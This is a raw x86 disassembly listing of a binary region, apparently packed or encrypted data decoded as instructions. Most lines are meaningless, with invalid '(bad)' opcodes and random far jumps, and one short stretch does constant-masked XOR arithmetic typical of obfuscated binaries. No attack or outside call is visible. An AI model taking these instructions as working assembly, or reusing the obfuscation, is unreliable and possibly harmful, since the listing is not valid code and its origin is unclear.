  41aefd:	daa    
  41aefe:	fs cmp bl,bl
  41af01:	jo     0x41af0f
  41af03:	adc    al,0xa1
  41af05:	dec    ebx
  41af06:	iret   
  41af07:	call   0x540b:0x63814c54
  41af0e:	jnp    0x41af5b
  41af10:	cmp    DWORD PTR [ecx+0x5831627e],esp
  41af16:	and    BYTE PTR [edx-0x3b88ac0a],0xfe
  41af1d:	mul    DWORD PTR ds:0x6336cf6f
  41af23:	(bad)  
  41af24:	lods   al,BYTE PTR ds:[esi]
  41af25:	fs icebp 
  41af27:	jecxz  0x41aebb
  41af29:	jg     0x41af34
  41af2b:	xchg   ebx,eax
  41af2c:	push   ss
  41af2d:	ja     0x41af64
  41af2f:	les    esp,FWORD PTR [esi-0x7604bb30]
  41af35:	sbb    al,0x61
  41af37:	mov    esi,0x56a1aa4b
  41af3c:	ret    
  41af3d:	out    dx,eax
  41af3e:	push   edi
  41af3f:	mov    edi,0x328b2725
  41af44:	loop   0x41af96
  41af46:	(bad)  
  41af47:	gs je  0x41af01
  41af4a:	mov    ebx,0xf15462ce
  41af4f:	fadd   QWORD PTR [edx+0x7d0ef7dc]
  41af55:	cld    
  41af56:	mov    esp,0xaa0ef209
  41af5b:	sub    DWORD PTR [ecx],edx
  41af5d:	dec    ebp
  41af5e:	add    eax,0x7ed822ef
  41af63:	fidiv  DWORD PTR [esi-0x25697404]
  41af69:	xchg   edx,eax
  41af6a:	pop    edx
  41af6b:	jge    0x41af4b
  41af6d:	es mov ch,0xb
  41af70:	or     esi,0xffffff84
  41af73:	inc    esp
  41af74:	(bad)  
  41af75:	ins    DWORD PTR es:[edi],dx
  41af76:	xchg   DWORD PTR [edi],ebp
  41af78:	add    DWORD PTR [esp+eiz*4-0xe7fd7ae],esi
  41af7f:	push   ss
  41af80:	add    esp,DWORD PTR [esp+esi*8-0x2c]
  41af84:	push   eax
  41af85:	in     al,dx
  41af86:	sub    BYTE PTR [esi],bh
  41af88:	lds    ebx,FWORD PTR [edi]
  41af8a:	adc    bh,0xd4
  41af8d:	sub    BYTE PTR [ebx+0x1a],ch
  41af90:	xchg   DWORD PTR [ecx],ecx
  41af92:	and    DWORD PTR [eax+0x7c775493],ebp
  41af98:	dec    ebp
  41af99:	retf   0x303c
  41af9c:	scas   al,BYTE PTR es:[edi]
  41af9d:	js     0x41afea
  41af9f:	rcr    DWORD PTR [ebp-0x15],cl
  41afa2:	out    dx,eax
  41afa3:	xor    DWORD PTR [esi-0x77],esi
  41afa6:	fiadd  WORD PTR [ebx-0x6a]
  41afa9:	pop    ebx
  41afaa:	repz fld DWORD PTR [edi+0x230e9cb]
  41afb1:	add    BYTE PTR [eax],al
  41afb3:	(bad)
  41afb6:	int    0xd4
  41afb8:	int    0xd9
  41afba:	fnstcw WORD PTR [edi-0x31e7effd]
  41afc0:	mov    eax,0xde10cbd2
  41afc5:	jg     0x41b03f
  41afc7:	adc    BYTE PTR [esi+0x78],bh
  41afca:	js     0x41afee
  41afcc:	push   ebp
  41afcd:	mov    cl,0x99
  41afcf:	add    ebx,DWORD PTR [ecx]
  41afd1:	xchg   edx,eax
  41afd2:	ja     0x41b012
  41afd4:	jbe    0x41b002
  41afd6:	jl     0x41b049
  41afd8:	adc    eax,0xfd5a2d31
  41afdd:	es mov ch,0xa0
  41afe0:	nop
  41afe1:	(bad)  
  41afe2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41afe3:	icebp  
  41afe4:	aad    0x1e
  41afe6:	pop    ss
  41afe7:	gs repz add bl,bl
  41afeb:	push   ebx
  41afec:	es push eax
  41afee:	mov    cl,0x6d
  41aff0:	jo     0x41b053
  41aff2:	inc    esi
  41aff3:	mov    cl,0x68
  41aff5:	imul   esp,DWORD PTR [edi-0x21],0xffffffb5
  41aff9:	inc    edi
  41affa:	leave  
  41affb:	aas    
  41affc:	imul   edx,esi,0xffffffe6
  41afff:	ins    BYTE PTR es:[edi],dx
  41b000:	int3   
  41b001:	rol    BYTE PTR [esi+0x9],cl
  41b004:	dec    ebx
  41b005:	test   al,0x2c
  41b007:	fwait
  41b008:	ret    
  41b009:	fild   QWORD PTR [ecx-0x68c736f8]
  41b00f:	ja     0x41af94
  41b011:	add    al,BYTE PTR [ebx-0x7fa710b7]
  41b017:	dec    esi
  41b018:	(bad)  
  41b019:	sbb    ebx,DWORD PTR [ecx+0x42]
  41b01c:	sub    esi,eax
  41b01e:	popf   
  41b01f:	or     ebp,DWORD PTR [esi-0x43385e55]
  41b025:	sbb    BYTE PTR [ecx],dl
  41b027:	std    
  41b028:	jbe    0x41afb7
  41b02a:	push   ss
  41b02b:	add    ch,BYTE PTR [edi-0xe19868c]
  41b031:	mov    BYTE PTR [esi],bl
  41b033:	add    al,0xdc
  41b035:	stc    
  41b036:	addr16 js 0x41b00a
  41b039:	lds    ecx,FWORD PTR [esi+0x666e2cfe]
  41b03f:	mov    DWORD PTR [ebp+0x26d14eed],ebp
  41b045:	push   ecx
  41b046:	mov    ecx,0xf428ae88
  41b04b:	adc    DWORD PTR [ebp+0x72],edx
  41b04e:	inc    ecx
  41b04f:	mov    ah,0x95
  41b051:	xchg   ebp,eax
  41b052:	mov    edx,0xa3447536
  41b057:	sar    BYTE PTR [ecx+0x1fdfafa5],0xef
  41b05e:	xchg   esp,eax
  41b05f:	btr    edi,esi
  41b062:	cs cmp eax,0x737ed3d1
  41b068:	shr    DWORD PTR [ecx-0x33],1
  41b06b:	cmp    BYTE PTR [ecx+eiz*2+0x40],dl
  41b06f:	out    dx,al
  41b070:	mov    WORD PTR [ebx-0x46],es
  41b073:	push   ds
  41b074:	out    dx,al
  41b075:	cmc    
  41b076:	sbb    al,0xd4
  41b078:	pop    esi
  41b079:	fwait
  41b07a:	xchg   ebx,eax
  41b07b:	jmp    0x3fba:0xe492cab5
  41b082:	xchg   edi,eax
  41b083:	out    0xf2,eax
  41b085:	xor    esp,esi
  41b087:	into   
  41b088:	in     eax,dx
  41b089:	lods   al,BYTE PTR ds:[esi]
  41b08a:	push   ebx
  41b08b:	dec    esi
  41b08c:	add    DWORD PTR [edi+0x36305e6a],eax
  41b092:	pop    ds
  41b093:	pop    ebp
  41b094:	mov    WORD PTR [ebx-0x1c],?
  41b097:	inc    esp
  41b098:	test   DWORD PTR [ebp+0x74d34b46],edx
  41b09e:	inc    esi
  41b09f:	push   edx
  41b0a0:	xor    eax,0x4ded8f39
  41b0a5:	lock ja 0x41b0c2
  41b0a8:	daa    
  41b0a9:	add    bh,BYTE PTR [ebx+edx*4]
  41b0ac:	xchg   esp,eax
  41b0ad:	mov    eax,ds:0xe541199c
  41b0b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b0b3:	xor    al,0xb1
  41b0b5:	(bad)
  41b0b9:	and    BYTE PTR [eax+edx*2+0x1b],bh
  41b0bd:	jo     0x41b078
  41b0bf:	xchg   esp,eax
  41b0c0:	dec    eax
  41b0c1:	fnstenv [ecx-0xb]
  41b0c4:	stos   BYTE PTR es:[edi],al
  41b0c5:	mov    edx,0x4fd7b354
  41b0cb:	fcomp  DWORD PTR [edi]
  41b0cd:	aad    0xe2
  41b0cf:	cld    
  41b0d0:	pop    esp
  41b0d2:	es adc al,dh
  41b0d5:	cmp    DWORD PTR [esi],esp
  41b0d7:	jns    0x41b0cb
  41b0d9:	mov    ds:0xab91fc9d,eax
  41b0de:	fs pop edi
  41b0e0:	jns    0x41b0c4
  41b0e2:	(bad)  [ecx+edi*4+0x6d30f4a6]
  41b0e9:	mov    ebx,0x2851193c
  41b0ee:	push   edx
  41b0ef:	leave  
  41b0f0:	cmp    DWORD PTR ds:0xd2ccdbc2,0x54250c69
  41b0fa:	mov    ebp,0x6d6546de
  41b0ff:	xor    eax,0x22db052c
  41b104:	sbb    al,0x7e
  41b106:	jle    0x41b09a
  41b108:	sahf   
  41b109:	mov    ch,0xc4
  41b10b:	ins    DWORD PTR es:[edi],dx
  41b10c:	jns    0x41b18a
  41b10e:	jae    0x41b0a4
  41b110:	mov    ds:0xc7352c86,eax
  41b115:	test   DWORD PTR [esi+0x37],esi
  41b118:	hlt    
  41b119:	dec    esi
  41b11a:	mov    ch,0xc
  41b11c:	jns    0x41b163
  41b11e:	(bad)  
  41b11f:	(bad)  
  41b120:	pop    edx
  41b121:	or     DWORD PTR ds:0xcc9815c5,ebp
  41b127:	call   0xf2ed:0x411e0c09
  41b12e:	push   ecx
  41b12f:	rol    DWORD PTR ds:0xbec2e531,0xa9
  41b136:	imul   ecx,ebx,0x56
  41b139:	mov    bl,0xc6
  41b13b:	adc    DWORD PTR [ecx-0x7b],eax
  41b13e:	ins    BYTE PTR es:[edi],dx
  41b13f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b140:	sbb    al,0x96
  41b142:	retf   0x6d18
  41b145:	and    eax,0x97a6d504
  41b14a:	or     edi,DWORD PTR [eax+eax*1]
  41b14d:	cvttps2pi mm6,QWORD PTR [edi]
  41b150:	push   ss
  41b151:	inc    edx
  41b152:	or     DWORD PTR [edx+0x7f],esi
  41b155:	lahf   
  41b156:	mov    WORD PTR [ebx-0x4be941f],ss
  41b15c:	(bad)  
  41b15d:	into   
  41b15e:	lods   al,BYTE PTR ds:[esi]
  41b15f:	data16 mov WORD PTR [edi+0x338f9981],gs
  41b166:	gs mov ebp,0xc7ae1235
  41b16c:	ja     0x41b1a6
  41b16e:	adc    al,0xe1
  41b170:	add    BYTE PTR [esi+eax*4-0x52],ah
  41b174:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b175:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b176:	dec    edx
  41b177:	rol    bl,1
  41b179:	jbe    0x41b130
  41b17b:	int    0xc
  41b17d:	mov    WORD PTR [edx-0x4f],gs
  41b180:	add    ch,BYTE PTR [ebx+0x327bf67e]
  41b186:	cmp    ecx,DWORD PTR [esi-0x41c6b825]
  41b18c:	push   0x60
  41b18e:	dec    ebx
  41b18f:	das    
  41b190:	repz ficomp DWORD PTR [eax]
  41b193:	int3   
  41b194:	mov    al,ds:0x3503e507
  41b199:	adc    BYTE PTR [ebx-0x35c982de],ah
  41b19f:	fidivr DWORD PTR [eax]
  41b1a1:	sub    DWORD PTR [edi+0x7482263],edx
  41b1a7:	lods   eax,DWORD PTR ds:[esi]
  41b1a8:	stos   BYTE PTR es:[edi],al
  41b1a9:	sti    
  41b1aa:	dec    ebx
  41b1ab:	mov    cl,0x43
  41b1ad:	mov    ds:0x64bed233,al
  41b1b2:	jmp    0x54b9:0x3bf5239c
  41b1b9:	sbb    al,0xc
  41b1bb:	loopne 0x41b215
  41b1bd:	mov    edx,0x5307391b
  41b1c2:	push   esi
  41b1c3:	ins    BYTE PTR es:[edi],dx
  41b1c4:	imul   edx,DWORD PTR [edx-0x1],0xffffff83
  41b1c8:	pop    ebx
  41b1c9:	outs   dx,BYTE PTR ds:[esi]
  41b1ca:	jo     0x41b1a5
  41b1cc:	retf   
  41b1cd:	xor    edi,DWORD PTR [eiz*4-0x7cc9b49e]
  41b1d4:	xchg   edi,eax
  41b1d5:	sub    eax,0xbe202617
  41b1da:	push   ecx
  41b1db:	push   ecx
  41b1dc:	jle    0x41b188
  41b1de:	xor    al,0x77
  41b1e0:	fidivr DWORD PTR [esp+ecx*4-0x1bba74b7]
  41b1e7:	jmp    0x41b41c
  41b1ec:	iret   
  41b1ed:	enter  0xd0d3,0xd3
  41b1f1:	fcmovnu st,st(3)
  41b1f3:	xlat   BYTE PTR ds:[ebx]
  41b1f4:	push   esp
  41b1f5:	sar    BYTE PTR ss:[bp+di-0x4a0c],0x39
  41b1fc:	sub    ah,bl
  41b1fe:	jg     0x41b278
  41b200:	adc    BYTE PTR [esi+0x78],bh
  41b203:	js     0x41b24e
  41b205:	lods   eax,DWORD PTR ds:[esi]
  41b206:	jp     0x41b22a
  41b208:	repz jmp 0x41b25d
  41b20b:	sub    ecx,DWORD PTR ds:0x24a03fea
  41b211:	frstor [edx+0x73]
  41b214:	loope  0x41b1d3
  41b216:	inc    edx
  41b217:	(bad)  
  41b219:	in     al,0xf6
  41b21b:	(bad)  
  41b21d:	push   esi
  41b21e:	xor    BYTE PTR [ecx-0x7c],dh
  41b221:	adc    bl,BYTE PTR [edx-0x59]
  41b224:	pop    ds
  41b225:	sbb    al,0x37
  41b227:	mov    edi,DWORD PTR [ecx]
  41b229:	mov    dl,0x68
  41b22b:	push   es
  41b22c:	jl     0x41b271
  41b22e:	add    DWORD PTR [ecx],eax
  41b230:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b231:	mov    ?,esp
  41b233:	rol    DWORD PTR [edi+0xa],cl
  41b236:	je     0x41b212
  41b238:	push   esp
  41b239:	pop    eax
  41b23a:	bound  edi,QWORD PTR [eax-0x765f3532]
  41b240:	inc    esi
  41b241:	scas   eax,DWORD PTR es:[edi]
  41b242:	sbb    al,0x19
  41b244:	jecxz  0x41b245
  41b246:	cmp    BYTE PTR [ebx+0x2b6ab0d8],al
  41b24c:	out    0x30,eax
  41b24e:	mov    WORD PTR [edi+ebx*8-0xb],gs
  41b252:	jb     0x41b266
  41b254:	fdiv   DWORD PTR [edi+0x0]
  41b257:	or     BYTE PTR ds:0x2ba48f6e,bh
  41b25d:	out    dx,eax
  41b25e:	push   ecx
  41b25f:	popf   
  41b260:	pop    ebx
  41b261:	es push esp
  41b263:	stos   DWORD PTR es:[edi],eax
  41b264:	pushf  
  41b265:	push   edx
  41b266:	xor    bl,ch
  41b268:	aam    0xf2
  41b26a:	xor    edi,DWORD PTR [edx+edi*4]
  41b26d:	add    DWORD PTR [edx+0x71],ebp
  41b270:	lds    edx,FWORD PTR [ebp+0x64277605]
  41b276:	lods   al,BYTE PTR ds:[esi]
  41b277:	mov    ch,0xee
  41b279:	ins    DWORD PTR es:[edi],dx
  41b27a:	aam    0xf1
  41b27c:	mov    ch,0x90
  41b27e:	ret    
  41b27f:	in     eax,dx
  41b280:	lock sub al,BYTE PTR [esi-0x6c4eea9b]
  41b287:	add    DWORD PTR [edi],edx
  41b289:	inc    esp
  41b28a:	cld    
  41b28b:	fdivr  QWORD PTR [eax-0x20a067c3]
  41b291:	ins    BYTE PTR es:[edi],dx
  41b292:	add    ebx,esi
  41b294:	(bad)  
  41b295:	jge    0x41b2f8
  41b297:	ins    DWORD PTR es:[edi],dx
  41b298:	stos   DWORD PTR es:[edi],eax
  41b299:	or     cl,ah
  41b29b:	mov    bh,0x9b
  41b29d:	push   ebx
  41b29e:	fadd   DWORD PTR [ecx+0x75169284]
  41b2a4:	ret    
  41b2a5:	icebp  
  41b2a6:	mov    DWORD PTR [esi],esi
  41b2a8:	loope  0x41b299
  41b2aa:	gs fdivr st,st(0)
  41b2ad:	ins    BYTE PTR es:[edi],dx
  41b2ae:	push   ebx
  41b2af:	stc    
  41b2b0:	push   ds
  41b2b1:	mov    ah,0x45
  41b2b3:	dec    edx
  41b2b4:	(bad)  
  41b2b5:	xor    BYTE PTR ss:[ebp-0x52cded2d],bl
  41b2bc:	push   ds
  41b2bd:	scas   al,BYTE PTR es:[edi]
  41b2be:	cmp    eax,0x1d220f5b
  41b2c3:	out    dx,eax
  41b2c4:	xchg   bh,bh
  41b2c6:	mov    ?,WORD PTR [edx-0x71c7560e]
  41b2cc:	sbb    BYTE PTR [edx],ah
  41b2ce:	xchg   edi,eax
  41b2cf:	and    eax,0x639e38e6
  41b2d4:	test   BYTE PTR [esi],ch
  41b2d6:	cli    
  41b2d7:	iret   
  41b2d8:	push   eax
  41b2d9:	aad    0xd0
  41b2db:	scas   eax,DWORD PTR es:[edi]
  41b2dc:	lods   al,BYTE PTR ds:[esi]
  41b2dd:	int    0xb2
  41b2df:	push   0x99a969ba
  41b2e4:	test   DWORD PTR [edx],0x946c4101
  41b2ea:	pusha  
  41b2eb:	push   cs
  41b2ec:	jmp    0x5f0d:0xef0cb56b
  41b2f3:	in     al,0xf0
  41b2f5:	(bad)
  41b2fa:	inc    ecx
  41b2fb:	xchg   esp,eax
  41b2fc:	imul   ebp,DWORD PTR [esi+0x23],0xffffffe5
  41b300:	lods   eax,DWORD PTR ds:[esi]
  41b301:	rcl    dh,cl
  41b303:	jmp    0x41b36d
  41b305:	(bad)  
  41b306:	push   0xffffffec
  41b308:	cmp    BYTE PTR [eax],ah
  41b30a:	in     al,dx
  41b30b:	inc    esp
  41b30c:	mov    ebp,0x4693eec7
  41b311:	ret    0x6554
  41b314:	mov    ecx,0xd4b4be07
  41b319:	data16 aas 
  41b31b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b31c:	mov    DWORD PTR [esi+ebx*8+0x547112aa],ebp
  41b323:	jge    0x41b307
  41b325:	repnz sbb dl,BYTE PTR [edx+ecx*2-0x5ea6e81b]
  41b32d:	cmp    esp,ecx
  41b32f:	inc    ecx
  41b330:	imul   ebp,ecx,0xffffffce
  41b333:	ins    DWORD PTR es:[edi],dx
  41b334:	outs   dx,BYTE PTR ds:[esi]
  41b335:	fdivr  st,st(7)
  41b337:	dec    edi
  41b338:	test   ah,0x6e
  41b33b:	jne    0x41b309
  41b33d:	test   ebp,ecx
  41b33f:	mov    edi,DWORD PTR [ecx-0x2a]
  41b342:	mov    bl,0xc
  41b344:	jl     0x41b2eb
  41b346:	lods   al,BYTE PTR ds:[esi]
  41b347:	out    0x93,al
  41b349:	lock fbld TBYTE PTR ds:0x37bbd211
  41b350:	push   eax
  41b351:	das    
  41b352:	shr    BYTE PTR [ebx-0x4cb96e48],1
  41b358:	leave  
  41b359:	xchg   ebp,eax
  41b35a:	cmovo  edi,DWORD PTR [ebx]
  41b35d:	rcl    DWORD PTR [esi-0x334e8ee5],0xa6
  41b364:	in     al,0x78
  41b366:	out    dx,al
  41b367:	out    dx,eax
  41b368:	mov    ch,0x5e
  41b36a:	loop   0x41b38c
  41b36c:	mov    edi,0x3b5ff937
  41b371:	pop    ss
  41b372:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b373:	and    DWORD PTR [eax-0x1d3dd64a],esp
  41b379:	mov    cl,0xf2
  41b37b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b37c:	or     ebp,edx
  41b37e:	xor    DWORD PTR [eax],0x6d5fd335
  41b384:	or     eax,0x1ef18c8c
  41b389:	jmp    0xccd2:0x5582e4eb
  41b390:	addr16 xchg eax,edi
  41b393:	test   eax,0xf632c89
  41b398:	into   
  41b399:	sbb    edx,DWORD PTR [ebx]
  41b39b:	pop    edi
  41b39c:	sub    ah,BYTE PTR [eax-0x25]
  41b39f:	in     eax,0x59
  41b3a1:	mov    edx,0x54002ab7
  41b3a6:	fiadd  DWORD PTR [esi-0x21]
  41b3a9:	shr    BYTE PTR [esi+edi*8-0x18c93108],0x13
  41b3b1:	xlat   BYTE PTR ds:[ebx]
  41b3b2:	cmp    edi,DWORD PTR ds:0xf6e535d7
  41b3b8:	in     al,dx
  41b3b9:	xor    eax,0xd2a28b79
  41b3be:	lods   eax,DWORD PTR ds:[esi]
  41b3bf:	daa    
  41b3c0:	popf   
  41b3c1:	fmul   DWORD PTR [edx]
  41b3c3:	mov    esi,0x6e0f1925
  41b3c8:	sbb    edi,DWORD PTR [edx+ebx*4]
  41b3cb:	(bad)  
  41b3cc:	fisubr DWORD PTR [esi]
  41b3ce:	and    DWORD PTR [ecx+0x4f],esp
  41b3d1:	and    al,0x9
  41b3d3:	push   ecx
  41b3d4:	enter  0xd12c,0x60
  41b3d8:	rol    esi,0xe8
  41b3db:	retf   0x246a
  41b3de:	sti    
  41b3df:	cmp    DWORD PTR [ecx-0x7e12974d],0x5d
  41b3e6:	jmp    0x7bfa59ed
  41b3eb:	sub    DWORD PTR [esi+0x3e],ebx
  41b3ee:	and    al,0x8f
  41b3f0:	cmp    dl,BYTE PTR [ebx-0x3b]
  41b3f3:	dec    edi
  41b3f4:	addr16 stc 
  41b3f6:	xlat   BYTE PTR ds:[ebx]
  41b3f7:	aaa    
  41b3f8:	adc    DWORD PTR [eax+eiz*4-0x25a7a9f2],ebx
  41b3ff:	cmp    DWORD PTR ds:[eax+0x69],ebp
  41b403:	pushf  
  41b404:	cli    
  41b405:	jmp    0xf206e14a
  41b40a:	idiv   DWORD PTR [edx]
  41b40c:	loopne 0x41b393
  41b40e:	addr16 mov ah,al
  41b411:	fmul   st,st(3)
  41b413:	pop    eax
  41b414:	sbb    cl,BYTE PTR [esi]
  41b416:	push   0xf
  41b418:	inc    edx
  41b419:	dec    ebx
  41b41a:	shl    BYTE PTR [edi+0xf],1
  41b41d:	scas   eax,DWORD PTR es:[edi]
  41b41e:	shr    DWORD PTR [ebx],0xe0
  41b421:	mov    DWORD PTR [ebp-0x24],esp
  41b424:	mov    eax,DWORD PTR [ebp-0x4]
  41b427:	mov    ecx,0x7510850
  41b42c:	xor    eax,ecx
  41b42e:	mov    edx,0x327298
  41b433:	add    eax,edx
  41b435:	mov    DWORD PTR [ebp+0x8],eax
  41b438:	mov    eax,DWORD PTR [ebp-0x18]
  41b43b:	xor    eax,ecx
  41b43d:	add    eax,edx
  41b43f:	mov    edx,DWORD PTR [ebp+0x14]
  41b442:	imul   eax,DWORD PTR [edx]
  41b445:	mov    edx,DWORD PTR [ebp-0x4]
  41b448:	xor    edx,ecx
  41b44a:	mov    ecx,DWORD PTR [ebp+0x8]
  41b44d:	lea    ecx,[edx+ecx*1+0x327298]
  41b454:	cmp    ecx,eax
  41b456:	je     0x41bfd6
  41b45c:	mov    edi,DWORD PTR [ebp-0x18]
  41b45f:	mov    eax,DWORD PTR [ebp+0x8]
  41b462:	mov    edx,DWORD PTR [ebp+0x14]
  41b465:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  41b469:	mov    ecx,0x7510850
  41b46e:	xor    edx,edx
  41b470:	xor    edi,ecx
  41b472:	mov    esi,0x327298
  41b477:	add    edi,esi
  41b479:	div    edi
  41b47b:	mov    edx,DWORD PTR [ebp-0x4]
  41b47e:	xor    edx,ecx
  41b480:	lea    eax,[edx+eax*1+0x327298]
  41b487:	mov    edx,DWORD PTR [ebp+0x8]
  41b48a:	mov    edi,DWORD PTR [ebp-0x24]
  41b48d:	mov    DWORD PTR [edi+edx*4],eax
  41b490:	mov    eax,DWORD PTR [ebp-0x18]
  41b493:	mov    edx,DWORD PTR [ebp+0x8]
  41b496:	xor    eax,ecx
  41b498:	lea    eax,[eax+edx*1+0x327298]
  41b49f:	mov    DWORD PTR [ebp+0x8],eax
  41b4a2:	mov    eax,DWORD PTR [ebp-0x18]
  41b4a5:	mov    edx,DWORD PTR [ebp+0x14]
  41b4a8:	jmp    0x41b6dd
  41b4ad:	int3   
  41b4ae:	(bad)  
  41b4af:	retf   0xd9d6
  41b4b2:	fxch   st(4)
  41b4b4:	leave  
  41b4b5:	mov    ch,0xbb
  41b4b7:	push   ds
  41b4b8:	hlt    
  41b4b9:	nop
  41b4ba:	arpl   WORD PTR [edx+0x7fe2c0eb],dx
  41b4c0:	js     0x41b4d2
  41b4c2:	jle    0x41b53c
  41b4c4:	js     0x41b50e
  41b4c6:	rol    BYTE PTR [esi+0x1aa04209],1
  41b4cc:	mov    ebp,0x21177f61
  41b4d1:	sub    cl,BYTE PTR [ebp+0x67]
  41b4d4:	jle    0x41b49b
  41b4d6:	mov    BYTE PTR [ebx-0x2d821c9d],ah
  41b4dc:	(bad)
  41b4df:	arpl   WORD PTR [ecx+0x4cc8ced8],bp
  41b4e5:	es dec edi
  41b4e7:	shl    BYTE PTR [eax+0x12],cl
  41b4ea:	dec    ebx
  41b4eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b4ec:	out    0xad,eax
  41b4ee:	add    eax,0xd34a0b54
  41b4f3:	and    cl,ah
  41b4f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b4f6:	mov    edx,0xead7702f
  41b4fb:	popf   
  41b4fc:	xor    BYTE PTR [ecx],dl
  41b4fe:	fdivr  QWORD PTR ds:0xa34bc208
  41b504:	mov    eax,0xbaef4e09
  41b509:	cli    
  41b50a:	ins    DWORD PTR es:[edi],dx
  41b50b:	push   cs
  41b50c:	push   ebp
  41b50d:	je     0x41b4af
  41b50f:	fcmovne st,st(3)
  41b511:	mov    al,0x7
  41b513:	mov    edi,0x78d2d31e
  41b518:	cld    
  41b519:	mov    edi,0x4ce71374
  41b51e:	sub    BYTE PTR [esi+0x6ee084eb],ah
  41b524:	ja     0x41b506
  41b526:	sbb    al,0x99
  41b528:	push   es
  41b529:	enter  0x14d4,0xc8
  41b52d:	mov    ds:0x85a4ff1f,eax
  41b532:	scas   al,BYTE PTR es:[edi]
  41b533:	fadd   QWORD PTR [ebp-0x39]
  41b536:	mov    esi,0x36f5314b
  41b53b:	sub    eax,0x3e83055
  41b541:	adc    al,0xc3
  41b543:	lds    edx,FWORD PTR [ecx+0x65]
  41b546:	cmp    bh,dh
  41b548:	imul   esp,DWORD PTR [ebp*2+0x50672f3],0x8fe26689
  41b553:	xlat   BYTE PTR ds:[ebx]
  41b554:	and    dh,BYTE PTR [ebp+0x76]
  41b557:	jno    0x41b52d
  41b559:	cmp    DWORD PTR [eax],0xfffffffd
  41b55c:	call   0xbb7a:0xd4a089bc
  41b563:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b564:	(bad)  
  41b565:	xlat   BYTE PTR ds:[ebx]
  41b566:	rol    DWORD PTR [ebx+0x1e],1
  41b569:	xor    eax,0x46fc312d
  41b56e:	push   0x715b7ade
  41b573:	test   DWORD PTR [eax],edi
  41b575:	xor    BYTE PTR [eax],dh
  41b577:	data16 out 0xbd,al
  41b57a:	sbb    bl,ah
  41b57c:	out    dx,eax
  41b57d:	pop    esp
  41b57e:	out    0x6c,al
  41b580:	and    al,0x6d
  41b582:	mov    edx,0x2fc7f1de
  41b587:	cmp    DWORD PTR [edi+0xb],edi
  41b58a:	nop
  41b58b:	sti    
  41b58c:	xor    DWORD PTR [ebp+0x2f],ebp
  41b58f:	adc    bh,BYTE PTR [edx-0x171369a4]
  41b595:	dec    cx
  41b597:	mov    BYTE PTR [edi],ch
  41b599:	jb     0x41b542
  41b59b:	or     al,0xbe
  41b59d:	cli    
  41b59e:	push   ebp
  41b59f:	pop    edx
  41b5a0:	xor    edx,eax
  41b5a2:	in     eax,dx
  41b5a3:	push   ecx
  41b5a4:	inc    edi
  41b5a5:	cmp    eax,0xb3d195c0
  41b5aa:	out    0x19,al
  41b5ac:	ja     0x41b600
  41b5ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b5af:	sbb    eax,0xab62ef99
  41b5b4:	sbb    ebp,DWORD PTR [esi+eax*1]
  41b5b7:	(bad)  
  41b5b8:	(bad)  
  41b5b9:	cli    
  41b5ba:	mov    esp,0x2ba46856
  41b5bf:	ins    BYTE PTR es:[edi],dx
  41b5c0:	adc    eax,0x9293a7b7
  41b5c5:	lahf   
  41b5c6:	mov    ebx,0xa1338e07
  41b5cb:	mov    eax,0x18714a94
  41b5d0:	bound  ebx,QWORD PTR [ecx-0x2]
  41b5d3:	sbb    DWORD PTR [edi+0x12],esi
  41b5d6:	jo     0x41b58c
  41b5d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b5d9:	push   edi
  41b5da:	ins    BYTE PTR es:[edi],dx
  41b5db:	pop    edi
  41b5dc:	sub    ah,BYTE PTR [ebp+0x2f]
  41b5df:	xor    edi,ebx
  41b5e1:	pop    ebx
  41b5e2:	dec    ebp
  41b5e3:	aas    
  41b5e4:	aad    0xcc
  41b5e6:	xor    ecx,ebp
  41b5e8:	sub    eax,0x71180e90
  41b5ed:	(bad)  
  41b5ee:	aad    0xff
  41b5f0:	fcom   QWORD PTR ds:0x761fcc6c
  41b5f6:	mov    dl,BYTE PTR [edx-0x11]
  41b5f9:	add    BYTE PTR [edx],al
  41b5fb:	mov    dh,BYTE PTR [eax+0x28f2abba]
  41b601:	enter  0x2564,0x54
  41b605:	add    ch,al
  41b607:	push   0x4f
  41b609:	dec    eax
  41b60a:	rcr    DWORD PTR [ecx+0x5b00a0e9],1
  41b610:	cmc    
  41b611:	dec    edx
  41b612:	dec    edi
  41b613:	rcr    DWORD PTR [eax],cl
  41b615:	loope  0x41b5e0
  41b617:	mov    eax,0xb5df1617
  41b61d:	mov    edx,0x98bfde1
  41b622:	dec    edi
  41b623:	sub    BYTE PTR [ecx+0x68],dh
  41b626:	mov    ecx,0x25d9d494
  41b62b:	add    esp,DWORD PTR [ebp+eax*8+0x27b47f97]
  41b632:	pop    ecx
  41b633:	pop    ebp
  41b634:	sub    eax,0x9a104e6e
  41b639:	outs   dx,DWORD PTR ds:[esi]
  41b63a:	or     eax,DWORD PTR [edx+esi*1]
  41b63d:	jmp    0x41b694
  41b63f:	pop    esi
  41b640:	fistp  WORD PTR [edi+0x7971b791]
  41b646:	dec    DWORD PTR [eax+ebx*1+0x7391bbe2]
  41b64d:	jp     0x41b650
  41b64f:	and    bh,BYTE PTR ss:[edi]
  41b652:	and    al,0x11
  41b654:	dec    esp
  41b655:	daa    
  41b656:	scas   eax,DWORD PTR es:[edi]
  41b657:	adc    ebp,eax
  41b659:	cs (bad) 
  41b65c:	lods   al,BYTE PTR ds:[esi]
  41b65d:	ret    
  41b65e:	push   ebp
  41b65f:	lahf   
  41b660:	fmul   DWORD PTR [esi+0x675ee29b]
  41b666:	js     0x41b5ec
  41b668:	mov    DWORD PTR [ebx-0x6d3679d4],ebx
  41b66e:	loop   0x41b67e
  41b670:	push   ebp
  41b671:	lods   al,BYTE PTR ds:[esi]
  41b672:	pushf  
  41b673:	cmp    eax,0x4bf5fa2
  41b678:	cmc    
  41b679:	push   eax
